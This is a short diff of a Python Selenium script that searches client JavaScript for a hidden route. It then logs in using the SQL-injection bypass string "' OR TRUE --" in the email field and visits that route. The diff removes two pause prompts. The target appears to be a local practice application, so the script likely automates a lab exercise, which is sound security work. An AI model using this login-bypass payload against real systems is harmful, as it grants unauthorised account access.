@@ -45,7 +45,6 @@ try:
 	#Parse all JS files for search_string and append to URL if found (user searches JS files for URL route & tests route in browser)
 	for file_url in absolute_client_files:
 		found, content = scan_js_for_string(file_url, search_string)
-
 		if found:
 			#User opens browser
 			driver.get(url)
@@ -56,8 +55,6 @@ try:
 			WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "email"))).send_keys("' OR TRUE --")
 			WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "password"))).send_keys("Password1!")
 			WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Log in')]"))).click()
-			input("PAUSE")
 			driver.get(f"http://{IP_ADDRESS}:{PORT}/#/" + search_string)
-			input("PAUSE")
 finally:
   driver.quit()
